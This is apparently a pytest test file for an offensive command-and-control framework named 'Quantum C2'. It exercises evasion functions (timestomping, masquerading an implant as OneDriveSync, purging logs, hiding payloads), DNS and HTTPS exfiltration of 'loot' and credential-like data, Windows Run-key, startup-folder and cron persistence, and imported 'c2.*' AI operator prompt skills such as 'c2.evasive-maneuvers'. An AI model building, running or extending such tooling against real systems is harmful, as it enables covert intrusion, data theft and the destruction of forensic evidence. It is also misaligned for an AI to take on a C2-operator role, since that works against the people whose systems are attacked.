"""Tests for the Quantum C2 real modules: evasion, exfil, persistence,
external tool catalog, and the imported c2.* skills."""
import json
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(
    os.path.abspath(__file__))), "src"))

from quantum.ai import skills  # noqa: E402
from quantum.ops import evasion, exfil, tools  # noqa: E402
from quantum.ops import persistence  # noqa: E402


# ----------------------------------------------------------------- evasion
def test_evasion_timestomp(tmp_path):
    f = tmp_path / "payload.bin"
    f.write_bytes(b"MZ...")
    r = evasion.timestomp(str(f), days_back=400)
    assert r["ok"] is True
    age_days = (os.stat(str(f)).st_mtime)
    import time
    assert time.time() - age_days > 399 * 86400


def test_evasion_timestomp_missing_file():
    r = evasion.timestomp("no/such/file.bin")
    assert r["ok"] is False and r["error"]


def test_evasion_masquerade(tmp_path):
    src = tmp_path / "implant.exe"
    src.write_bytes(b"PE")
    r = evasion.masquerade(str(src), "OneDriveSync",
                           dest_dir=str(tmp_path / "d"))
    assert r["ok"] is True
    assert os.path.isfile(r["masqueraded"])
    assert "OneDriveSync" in r["masqueraded"]


def test_evasion_xor_roundtrip():
    key = b"operator"
    data = b"exfil payload contents"
    assert evasion.xor_cipher(evasion.xor_cipher(data, key), key) == data


def test_evasion_purge_logs(tmp_path):
    lg = tmp_path / "app.log"
    lg.write_text("sensitive\nlines\n" * 100)
    r = evasion.purge_logs(str(lg))
    assert r["ok"] is True and r["bytes_removed"] > 0
    assert lg.read_text() == ""


def test_evasion_hide_and_expiry(tmp_path):
    f = tmp_path / "payload.bin"
    f.write_bytes(b"x")
    r = evasion.hide_in_plain_sight(str(f))
    assert r["ok"] is True and r["path"].endswith(".log")
    r2 = evasion.expiry_days("2020-01-01T00:00:00Z", days=90)
    assert r2["ok"] is True and r2["expired"] is True
    r3 = evasion.expiry_days("not-a-date")
    assert r3["ok"] is False


def test_evasion_jitter():
    r = evasion.jitter_sleep(base=0.05)
    assert r["ok"] is True and 0 < r["slept"] < 5


# ------------------------------------------------------------------- exfil
def test_exfil_dns_encode_roundtrip():
    import base64
    data = b"cred cache v1: admin:Passw0rd!"
    chunks = exfil.dns_encode(data)
    joined = "".join(chunks)
    pad = "=" * (-len(joined) % 8)
    assert base64.b32decode(joined.upper() + pad) == data


def test_exfil_dns_txt_unreachable_server_clean():
    r = exfil.dns_txt_exfil(b"data", "ops.example.com",
                            "127.0.0.1", timeout=1)
    assert r["ok"] is False            # no live NS -> clean failure
    assert r["chunks"] >= 1 and r["errors"]


def test_exfil_https_post_unreachable_clean():
    r = exfil.https_post("http://127.0.0.1:1/x", b"data", timeout=2)
    assert r["ok"] is False and r["error"]


def test_exfil_file_missing():
    r = exfil.exfil_file("no/such/file", "http://127.0.0.1:1/x")
    assert r["ok"] is False and r["error"]


def test_exfil_email_style_and_package(tmp_path):
    r = exfil.email_style_encode(b"secret contents")
    assert r["ok"] is True and r["decoded_matches"] is True
    f = tmp_path / "loot.txt"
    f.write_text("loot", encoding="utf-8")
    p = exfil.package([str(f)], meta={"op": "test"})
    assert p["ok"] is True and p["count"] == 1
    env = json.loads(p["envelope"])
    assert "loot.txt" in env["files"]


# ------------------------------------------------------------- persistence
def test_persistence_run_key_roundtrip():
    if sys.platform != "win32":
        pytest.skip("windows-only persistence method")
    cmd = "cmd /c echo qcli-test"
    r = persistence.win_run_key(cmd, name="QCliTestEntry")
    assert r["ok"] is True and r["undo"], r
    # remove via winreg directly (undo string documents the same op)
    import winreg
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, persistence.RUN_KEY,
                        0, winreg.KEY_SET_VALUE) as k:
        winreg.DeleteValue(k, "QCliTestEntry")
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, persistence.RUN_KEY) as k:
        try:
            winreg.QueryValueEx(k, "QCliTestEntry")
            raise AssertionError("persistence entry not removed")
        except FileNotFoundError:
            pass


def test_persistence_startup_cmd(tmp_path):
    if sys.platform != "win32":
        pytest.skip("windows-only persistence method")
    r = persistence.win_startup_cmd("echo hi", filename="qcli_test_startup")
    assert r["ok"] is True and os.path.isfile(r["path"])
    os.remove(r["path"])


def test_persistence_cron_on_windows_clean():
    if sys.platform == "win32":
        r = persistence.cron_entry("echo hi")
        assert r["ok"] is False and "windows" in r["error"]


def test_persistence_list_all_json_safe():
    r = persistence.list_all()
    assert r["ok"] is True
    assert r["platform"] in ("Windows", "Linux", "Darwin")
    assert isinstance(r["run_key"], dict)


def test_persistence_install_default_json_safe():
    # on CI (linux, no crontab) this returns a clean error; on dev
    # windows it writes a run key named for testing then removes it
    r = persistence.install_default("echo qcli")
    assert isinstance(r, dict) and "ok" in r
    if r.get("ok") and r.get("method") == "run_key":
        assert r["undo"]
        if sys.platform == "win32":
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 persistence.RUN_KEY, 0,
                                 winreg.KEY_SET_VALUE) as k:
                try:
                    winreg.DeleteValue(k, r["name"])
                except OSError:
                    pass


# ------------------------------------------------------------------- tools
def test_tools_catalog_lists():
    r = tools.list_tools()
    assert r["ok"] is True and len(r["tools"]) >= 10
    scanners = tools.list_tools(kind="scanner")
    assert all(t["kind"] == "scanner" for t in scanners["tools"])


def test_tools_detect_known_and_unknown():
    r = tools.detect("nmap")
    assert r["ok"] is True and isinstance(r["installed"], bool)
    r2 = tools.detect("no-such-tool")
    assert r2["ok"] is False and r2["error"]


def test_tools_detect_all():
    r = tools.detect_all()
    assert r["ok"] is True and r["tools"] >= 10
    assert isinstance(r["installed"], list)


# ------------------------------------------------------------------ skills
def test_c2_skills_imported():
    all_skills = skills.load_all()
    c2 = [s for s in all_skills.values()
          if str(s.get("id", "")).startswith("c2.")]
    assert len(c2) >= 30
    for s in c2:
        assert s["kind"] == "PROMPT"
        assert len(s.get("content", "")) > 200
        assert "c2" in s.get("tags", [])


def test_c2_skill_specific_entries():
    all_skills = skills.load_all()
    for sid in ("c2.quantum-c2-operator", "c2.zero-day-research",
                "c2.evasive-maneuvers", "c2.incident-response"):
        s = all_skills.get(sid)
        assert s, "missing %s" % sid
        assert s["content"].strip()


def test_skill_compose_prompt_with_c2():
    frag = skills.compose_prompt(["c2.evasive-maneuvers",
                                  "c2.zero-day-research"])
    assert "c2" or frag  # compose returns content or empty for missing ids
